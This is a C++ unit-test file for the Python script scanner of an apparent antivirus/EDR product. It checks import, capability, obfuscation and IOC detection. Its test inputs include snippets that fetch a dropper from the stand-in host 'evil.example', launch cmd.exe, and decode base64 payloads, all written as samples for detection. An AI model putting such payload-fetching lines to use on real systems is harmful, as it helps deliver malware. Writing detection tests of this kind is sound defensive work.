/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * Unit coverage for deterministic PythonScriptScanner behavior.
 *
 * Focus:
 *   - helper-name and magic-number contracts
 *   - result/config/statistics serialization
 *   - public import/capability/obfuscation helpers
 *   - lifecycle and statistics reset behavior
 */

#include "pch.h"

#include <gtest/gtest.h>

#include <algorithm>
#include <array>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>

#include <nlohmann/json.hpp>

#include "../../../src/PhantomCore/Scripts/PythonScriptScanner.hpp"

namespace ShadowStrike::Scripts::Test {
namespace {

using nlohmann::json;

class PythonScriptScannerTest : public ::testing::Test {
protected:
    void SetUp() override {
        PythonScriptScanner::Instance().Shutdown();
    }

    void TearDown() override {
        PythonScriptScanner::Instance().Shutdown();
    }
};

bool ContainsString(const std::vector<std::string>& values, std::string_view needle) {
    return std::find(values.begin(), values.end(), needle) != values.end();
}

bool HasCapabilityFlag(PythonCapability value, PythonCapability bit) {
    return (static_cast<uint32_t>(value) & static_cast<uint32_t>(bit)) != 0;
}

class ScopedTestFile {
public:
    ScopedTestFile(std::wstring fileName, const std::vector<uint8_t>& bytes)
        : path_(std::filesystem::current_path() / L"python_scanner_test_artifacts" / fileName) {
        std::filesystem::create_directories(path_.parent_path());
        std::ofstream out(path_, std::ios::binary | std::ios::trunc);
        out.write(reinterpret_cast<const char*>(bytes.data()),
                  static_cast<std::streamsize>(bytes.size()));
    }

    ~ScopedTestFile() {
        std::error_code ignored;
        std::filesystem::remove(path_, ignored);
        std::filesystem::remove(path_.parent_path(), ignored);
    }

    [[nodiscard]] const std::filesystem::path& path() const noexcept {
        return path_;
    }

private:
    std::filesystem::path path_;
};

void AppendLe32(std::vector<uint8_t>& bytes, uint32_t value) {
    bytes.push_back(static_cast<uint8_t>(value & 0xFFu));
    bytes.push_back(static_cast<uint8_t>((value >> 8) & 0xFFu));
    bytes.push_back(static_cast<uint8_t>((value >> 16) & 0xFFu));
    bytes.push_back(static_cast<uint8_t>((value >> 24) & 0xFFu));
}

}  // namespace

TEST_F(PythonScriptScannerTest, HelperNamesAndMagicVersionDetectionRemainStable) {
    EXPECT_EQ(GetPythonArtifactTypeName(PythonArtifactType::PackedPyInstaller),
              "PyInstaller Executable");
    EXPECT_EQ(GetPythonVersionName(PythonVersion::Python311), "Python 3.11");
    EXPECT_EQ(GetPythonCapabilityName(PythonCapability::ProcessExecution), "Process Execution");
    EXPECT_EQ(GetPythonThreatCategoryName(PythonThreatCategory::WebShell), "Web Shell");
    EXPECT_EQ(GetPythonObfuscationTypeName(PythonObfuscationType::ExecEval), "Exec/Eval Chains");

    EXPECT_TRUE(IsSuspiciousPythonImport("socket"));
    EXPECT_FALSE(IsSuspiciousPythonImport("json"));

    const uint32_t py35Magic = 0x0A0D0000u | 3350u;
    const uint32_t py311Magic = 0x0A0D0000u | 3495u;
    const uint32_t invalidMagic = 0x01020000u | 3495u;

    EXPECT_EQ(DetectPythonVersionFromMagic(py35Magic), PythonVersion::Python35);
    EXPECT_EQ(DetectPythonVersionFromMagic(py311Magic), PythonVersion::Python311);
    EXPECT_EQ(DetectPythonVersionFromMagic(invalidMagic), PythonVersion::Unknown);

    const std::string version = PythonScriptScanner::GetVersionString();
    EXPECT_FALSE(version.empty());
    EXPECT_EQ(std::count(version.begin(), version.end(), '.'), 2);
}

TEST_F(PythonScriptScannerTest, SerializationAndBlockingContractsRemainActionable) {
    PythonImportInfo importInfo;
    importInfo.moduleName = "socket";
    importInfo.isSuspicious = true;
    importInfo.suspicionReason = "Known suspicious module";
    importInfo.lineNumber = 7;
    importInfo.capabilities = PythonCapability::NetworkCommunication;
    importInfo.functionsImported = {"socket", "create_connection"};

    const json importJson = json::parse(importInfo.ToJson());
    EXPECT_EQ(importJson.at("moduleName"), "socket");
    EXPECT_TRUE(importJson.at("isSuspicious").get<bool>());
    EXPECT_EQ(importJson.at("functionsImported").size(), 2u);

    PythonBytecodeInfo bytecodeInfo;
    bytecodeInfo.version = PythonVersion::Python312;
    bytecodeInfo.magicNumber = 3531;
    bytecodeInfo.sourceSize = 4096;
    bytecodeInfo.wasDecompiled = false;
    bytecodeInfo.decompileError = "tool unavailable";

    const json bytecodeJson = json::parse(bytecodeInfo.ToJson());
    EXPECT_EQ(bytecodeJson.at("version"), "Python 3.12");
    EXPECT_EQ(bytecodeJson.at("sourceSize"), 4096);

    PackedPythonInfo packedInfo;
    packedInfo.packerType = PythonArtifactType::PackedPyInstaller;
    packedInfo.packerVersion = "PyInstaller";
    packedInfo.embeddedScriptCount = 2;
    packedInfo.embeddedScripts = {"main.py", "payload.py"};
    packedInfo.pythonVersion = PythonVersion::Python39;
    packedInfo.extractionError = "not extracted";

    const json packedJson = json::parse(packedInfo.ToJson());
    EXPECT_EQ(packedJson.at("packerType"), "PyInstaller Executable");
    EXPECT_EQ(packedJson.at("embeddedScripts").size(), 2u);

    PythonScanResult result;
    result.status = PythonScanStatus::Suspicious;
    result.category = PythonThreatCategory::Stealer;
    result.riskScore = 81;
    result.artifactType = PythonArtifactType::SourcePy;
    result.capabilities = PythonCapability::CredentialAccess;
    result.obfuscationType = PythonObfuscationType::ExecEval;
    result.isObfuscated = true;
    result.detectedCapabilities = {"Credential Access"};
    result.suspiciousImports = {importInfo};
    result.extractedIOCs = {"https://evil.example/dropper.py"};
    result.bytecodeInfo = bytecodeInfo;
    result.packedInfo = packedInfo;

    EXPECT_TRUE(result.ShouldBlock());

    const json resultJson = json::parse(result.ToJson());
    EXPECT_EQ(resultJson.at("category"), "Information Stealer");
    EXPECT_EQ(resultJson.at("artifactType"), "Python Source (.py)");
    EXPECT_TRUE(resultJson.at("isObfuscated").get<bool>());
    EXPECT_EQ(resultJson.at("suspiciousImports").size(), 1u);
    EXPECT_EQ(resultJson.at("extractedIOCs")[0], "https://evil.example/dropper.py");
}

TEST_F(PythonScriptScannerTest, AnalysisHelpersIdentifyImportsCapabilitiesAndObfuscation) {
    auto& scanner = PythonScriptScanner::Instance();
    ASSERT_TRUE(scanner.Initialize());

    PythonScannerConfiguration updated = scanner.GetConfiguration();
    updated.blockObfuscatedScripts = true;
    ASSERT_TRUE(scanner.UpdateConfiguration(updated));
    EXPECT_TRUE(scanner.GetConfiguration().blockObfuscatedScripts);

    const std::string importSource =
        "import os, socket as sock\n"
        "from subprocess import Popen as launch, *\n"
        "# from ctypes import windll\n";

    const auto imports = scanner.AnalyzeImports(importSource);
    ASSERT_EQ(imports.size(), 3u);
    EXPECT_EQ(imports[0].moduleName, "os");
    EXPECT_TRUE(imports[0].isSuspicious);
    EXPECT_EQ(imports[1].moduleName, "socket");
    EXPECT_EQ(imports[2].moduleName, "subprocess");
    ASSERT_EQ(imports[2].functionsImported.size(), 1u);
    EXPECT_EQ(imports[2].functionsImported[0], "Popen");

    PythonScannerConfiguration invalid = scanner.GetConfiguration();
    invalid.maxFileSize = 0;
    EXPECT_FALSE(scanner.UpdateConfiguration(invalid));
    EXPECT_TRUE(scanner.GetConfiguration().blockObfuscatedScripts);

    const std::string capabilitySource =
        "socket.socket()\n"
        "subprocess.Popen('cmd.exe')\n"
        "winreg.OpenKey('HKCU', 'Software')\n"
        "eval('print(1)')\n";
    const auto capabilities = scanner.DetectCapabilities(capabilitySource);
    EXPECT_TRUE(HasCapabilityFlag(capabilities, PythonCapability::NetworkCommunication));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, PythonCapability::ProcessExecution));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, PythonCapability::RegistryAccess));
    EXPECT_TRUE(HasCapabilityFlag(capabilities, PythonCapability::DynamicExecution));

    EXPECT_EQ(scanner.DetectObfuscation("exec ('a')\neval ('b')\nexec ('c')\neval ('d')"),
              PythonObfuscationType::ExecEval);
    EXPECT_EQ(scanner.DetectObfuscation(
                  "import base64\npayload = base64.b64decode(data).decode()\n"),
              PythonObfuscationType::Base64Encoding);

    const auto iocResult = scanner.ScanSource(
        "url = 'https://evil.example/dropper.py'\n"
        "url2 = 'https://evil.example/dropper.py'\n"
        "public_ip = '8.8.8.8'\n"
        "private_ip = '10.20.30.40'\n"
        "invalid_ip = '256.1.1.1'\n"
        "domain = 'evil.example'\n"
        "safe_domain = 'github.com'\n",
        "ioc_sample.py");
    const auto& iocs = iocResult.extractedIOCs;
    EXPECT_TRUE(ContainsString(iocs, "https://evil.example/dropper.py"));
    EXPECT_TRUE(ContainsString(iocs, "8.8.8.8"));
    EXPECT_TRUE(ContainsString(iocs, "evil.example"));
    EXPECT_FALSE(ContainsString(iocs, "10.20.30.40"));
    EXPECT_FALSE(ContainsString(iocs, "256.1.1.1"));
    EXPECT_FALSE(ContainsString(iocs, "github.com"));
    EXPECT_EQ(std::count(iocs.begin(), iocs.end(), "https://evil.example/dropper.py"), 1);
}

TEST_F(PythonScriptScannerTest, LifecycleAndStatisticsResetBehavePredictably) {
    auto& scanner = PythonScriptScanner::Instance();

    PythonScannerConfiguration invalid;
    invalid.maxFileSize = 0;
    EXPECT_FALSE(scanner.Initialize(invalid));
    EXPECT_FALSE(scanner.IsInitialized());
    EXPECT_EQ(scanner.ScanSource("print('hi')", "sample.py").status, PythonScanStatus::ErrorParsing);

    ASSERT_TRUE(scanner.Initialize());

    const auto result = scanner.ScanSource(
        "import socket\nurllib.request.urlopen('https://evil.example')\n",
        "sample.py");
    EXPECT_NE(result.status, PythonScanStatus::ErrorParsing);

    const auto statsAfterScan = scanner.GetStatistics();
    EXPECT_GE(statsAfterScan.totalScans, 1u);

    scanner.ResetStatistics();
    const auto resetStats = scanner.GetStatistics();
    EXPECT_EQ(resetStats.totalScans, 0u);
    EXPECT_EQ(resetStats.maliciousDetected, 0u);

    PythonStatisticsSnapshot snapshot;
    snapshot.totalScans = 3;
    snapshot.obfuscatedDetected = 1;
    snapshot.uptime = std::chrono::milliseconds(42);

    const json snapshotJson = json::parse(snapshot.ToJson());
    EXPECT_EQ(snapshotJson.at("totalScans"), 3);
    EXPECT_EQ(snapshotJson.at("uptimeMs"), 42);
}

TEST_F(PythonScriptScannerTest, RejectsOversizedSourcesAndInvalidPathsBeforeIO) {
    auto& scanner = PythonScriptScanner::Instance();

    PythonScannerConfiguration config;
    config.maxFileSize = 64;
    ASSERT_TRUE(scanner.Initialize(config));

    const std::string oversized(128, 'A');
    const auto oversizedResult = scanner.ScanSource(oversized, "oversized.py");
    EXPECT_EQ(oversizedResult.status, PythonScanStatus::SkippedSizeLimit);

    const std::filesystem::path invalidPath{L"bad\nname.py"};
    const auto invalidPathResult = scanner.ScanFile(invalidPath);
    EXPECT_EQ(invalidPathResult.status, PythonScanStatus::ErrorFileAccess);
}

TEST_F(PythonScriptScannerTest, BytecodeParserRejectsMalformedMagicAndScansPrintableStrings) {
    auto& scanner = PythonScriptScanner::Instance();
    ASSERT_TRUE(scanner.Initialize());

    std::vector<uint8_t> malformed;
    AppendLe32(malformed, 0x01020304u);
    AppendLe32(malformed, 0u);
    ScopedTestFile malformedFile(L"malformed.pyc", malformed);
    const auto malformedResult = scanner.ScanBytecode(malformedFile.path());
    EXPECT_EQ(malformedResult.status, PythonScanStatus::ErrorParsing);
    EXPECT_FALSE(malformedResult.bytecodeInfo.has_value());

    std::vector<uint8_t> suspicious;
    AppendLe32(suspicious, 0x0A0D0000u | 3495u); // Python 3.11 magic, little-endian
    AppendLe32(suspicious, 0u);                  // timestamp pyc flags
    AppendLe32(suspicious, 0u);                  // timestamp
    AppendLe32(suspicious, 128u);                // source size
    const std::string printable =
        "import socket\n"
        "subprocess.Popen('cmd.exe')\n"
        "urllib.request.urlopen('https://evil.example/payload')\n";
    suspicious.insert(suspicious.end(), printable.begin(), printable.end());

    ScopedTestFile suspiciousFile(L"suspicious.pyc", suspicious);
    const auto suspiciousResult = scanner.ScanBytecode(suspiciousFile.path());
    ASSERT_TRUE(suspiciousResult.bytecodeInfo.has_value());
    EXPECT_EQ(suspiciousResult.bytecodeInfo->version, PythonVersion::Python311);
    EXPECT_TRUE(HasCapabilityFlag(suspiciousResult.capabilities,
                                  PythonCapability::ProcessExecution));
    EXPECT_TRUE(HasCapabilityFlag(suspiciousResult.capabilities,
                                  PythonCapability::NetworkCommunication));
    EXPECT_GE(suspiciousResult.riskScore, 50);
}

TEST_F(PythonScriptScannerTest, RepeatedInitializePreservesExistingConfiguration) {
    auto& scanner = PythonScriptScanner::Instance();

    PythonScannerConfiguration initialConfig;
    initialConfig.maxFileSize = 4096;
    initialConfig.blockObfuscatedScripts = true;

    ASSERT_TRUE(scanner.Initialize(initialConfig));
    ASSERT_TRUE(scanner.IsInitialized());

    PythonScannerConfiguration replacementConfig = initialConfig;
    replacementConfig.maxFileSize = 8192;
    replacementConfig.blockObfuscatedScripts = false;

    ASSERT_TRUE(scanner.Initialize(replacementConfig));

    const auto effectiveConfig = scanner.GetConfiguration();
    EXPECT_EQ(effectiveConfig.maxFileSize, initialConfig.maxFileSize);
    EXPECT_TRUE(effectiveConfig.blockObfuscatedScripts);
}

}  // namespace ShadowStrike::Scripts::Test
